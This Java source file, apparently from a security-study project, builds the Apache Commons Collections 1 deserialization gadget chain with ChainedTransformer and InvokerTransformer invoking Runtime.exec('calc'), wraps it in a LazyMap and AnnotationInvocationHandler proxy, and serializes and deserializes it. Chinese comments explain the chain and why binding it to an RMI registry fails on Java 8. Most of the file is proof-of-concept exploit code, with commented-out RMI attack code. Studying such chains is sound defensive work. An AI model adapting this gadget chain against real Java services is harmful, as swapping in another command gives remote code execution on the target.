package com.madaha.codesecone.controller.AdvancedAttack.deserialize.rmiDeserialize;

// CC1的反序列化漏洞验证：必须要在 Apache Commons Collections3.2.1以下，JDK版本：1.7.0_80以下。
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;


// 测试失败
public class UserServerEval_test_java8_CC1_fail {

    // 服务端与客户端攻击注册中心
    public void toRegistryEval() throws Exception{

        // 因为在执行反序列漏洞链的过程中会报错，导致程序运行崩溃。
        // 因此接一个 try-catch 抛出异常，保证程序不会异常退出。
        try {

            // 构造 Transformer 的 runtime 命令执行链。
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);


            // Map innerMap = new HashMap();
            // innerMap.put("value", "value");
            // Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            /**
             * 因为 java 1.8 的 AnnotationInvocationHandler 类被改写
             * 所以，此处使用 TransformedMap 改用 LazyMap 实现。
             */
            Map innerMap = new HashMap();
            Map outerMap = LazyMap.decorate(innerMap, transformerChain);

            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            InvocationHandler evalObject = (InvocationHandler)constructor.newInstance(java.lang.annotation.Retention.class, outerMap);


            /**
             * 1、AnnotationInvocationHandler 实际上就是一个 InvocationHandler。（注解的 动态代理接口的 实现类）
             * 2、我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任何方法，就会进入到 AnnotationInvocationHandler#invoke() 方法中。
             * 3、进而就触发了我们的 LazyMap#get()，随后的利用链就和 TransformedMap 的一样了。
             */
            // Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, evalObject);
            // evalObject = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);
            // Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, evalObject));
            /**
             * JVM报错：【java: 不兼容的类型: java.lang.reflect.InvocationHandler无法转换为java.rmi.Remote】
             *
             * 在当前情况下：
             *      （1）使用 java1.8
             *      （2）使用 LazyMap 类替代 TransformedMap
             *      （3）因为 LazyMap 需要使用 Proxy 接口
             *      （4）且 RMI 需要使用 Remote 接口
             *      （5）在使用 RMI 进行反序列化攻击的时候，无法将 Proxy 接口 也 拥有 Remote接口
             *      （6）因此在当前环境下，无法使用该反序列化链进行攻击。
             */
//            Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, evalObject);
//            evalObject = (InvocationHandler) constructor.newInstance(
//                    Retention.class,
//                    Remote.class.cast(
//                            (Map) Proxy.newProxyInstance(
//                                    Map.class.getClassLoader(),
//                                    new Class[]{Map.class},
//                                    evalObject
//                            )
//                    )
//            );
//
//            // Registry registry = LocateRegistry.createRegistry(3333);
//            Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1099);
//            registry_remote.bind("HelloRegistry", evalObject);
//
//            System.out.println("rmi start at 1099");



            Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, evalObject);
            evalObject = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);



            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream out = new ObjectOutputStream(baos);
            out.writeObject(evalObject);
            out.flush();
            out.close();

            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream in = new ObjectInputStream(bais);
            in.readObject();
            in.close();

        } catch (Exception e){
            e.printStackTrace();
        }
    }


    public static void main(String[] args) throws Exception{
        UserServerEval_test_java8_CC1_fail eval = new UserServerEval_test_java8_CC1_fail();
        eval.toRegistryEval();
    }
}
